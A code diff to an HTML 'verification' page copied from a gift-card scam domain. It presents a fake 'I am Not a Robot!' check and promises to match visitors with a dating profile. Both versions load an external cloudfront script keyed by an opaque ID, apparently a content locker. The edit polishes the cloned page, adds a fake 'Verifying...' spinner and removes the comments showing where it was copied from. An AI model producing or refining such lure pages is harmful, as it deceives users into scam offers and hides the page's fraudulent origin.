@@ -1,50 +1,59 @@
 <!DOCTYPE html>
-<html>
-
-<!-- Mirrored from gift-card.eonw.xyz/verify.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 14 Sep 2024 12:18:05 GMT -->
+<html lang="en">
 <head>
-	<meta charset="UTF-8">
-	<meta name="viewport" content="width=device-width, initial-scale=1.0">
-	<link rel="stylesheet" href="css/verify.css">
-	<title>Last Step!</title>
-<script type="text/javascript">
-    var idSli_AWj_YQScwc={"it":4437264,"key":"160cc"};
-</script>
-<script src="https://d2v7l2267atlz5.cloudfront.net/47da6a4.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Complete Verification | Last Step</title>
+    <link rel="stylesheet" href="css/verify.css">
+    <script type="text/javascript">
+        var idSli_AWj_YQScwc = {"it":4437264,"key":"160cc"};
+    </script>
+    <script src="https://d2v7l2267atlz5.cloudfront.net/47da6a4.js"></script>
+    <style>
+        /* Inline critical CSS */
+        .container {
+            max-width: 800px;
+            margin: 50px auto;
+            padding: 20px;
+            text-align: center;
+        }
+        h1 {
+            color: #e91e63;
+            margin-bottom: 30px;
+        }
+    </style>
 </head>
 <body>
-<div class="container">
-  <h1>Before we connect you with a profile, please complete this quick human verification process.</h1>
-  <section>
-    <form id="connect-form">
-      <div class="checkbox-wrapper-26">
-        <input type="checkbox" id="_checkbox-26" onclick="_om()" required>
-        <label for="_checkbox-26">
-          <div class="tick_mark"></div>
-        </label>
-      </div>
-      <button class="submit-btn" onclick="_om()">I am Not a Robot!</button>
-    </form>
-    <br>
-    <h2>Once verified, we'll match you with a profile and send the connection details to your email.</h2>
-  </section>
-</div>
+    <div class="container">
+        <h1>Before we connect you with a profile, please complete this quick human verification process.</h1>
+        <section>
+            <form id="connect-form">
+                <div class="checkbox-wrapper-26">
+                    <input type="checkbox" id="_checkbox-26" onclick="_om()" required>
+                    <label for="_checkbox-26">
+                        <div class="tick_mark"></div>
+                    </label>
+                </div>
+                <button class="submit-btn" onclick="_om()">I am Not a Robot!</button>
+            </form>
+            <br>
+            <h2>Once verified, we'll match you with a profile and send the connection details to your email.</h2>
+        </section>
+    </div>
 
-<div class="loader">
-  <!-- Optional: Show a loading icon here -->
-</div>
+    <div class="loader">
+        <div class="loader-content">
+            <div class="spinner"></div>
+            <p>Verifying...</p>
+        </div>
+    </div>
 
-<script type="text/javascript">
-    var idSli_AWj_YQScwc={"it":4437264,"key":"160cc"};
-</script>
-<script src="https://d2v7l2267atlz5.cloudfront.net/47da6a4.js"></script>
-
-	<script>
-
-window.addEventListener("load", ()=>{const e=document.querySelector(".loader");setTimeout(()=>{e.remove()},1500)});
-	</script>
-	<script src="js/main.js"></script>
+    <script src="js/verification.js"></script>
+    <script>
+        window.addEventListener("load", ()=>{
+            const e=document.querySelector(".loader");
+            setTimeout(()=>{e.remove()},1500)
+        });
+    </script>
 </body>
-
-<!-- Mirrored from gift-card.eonw.xyz/verify.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 14 Sep 2024 12:18:06 GMT -->
 </html>
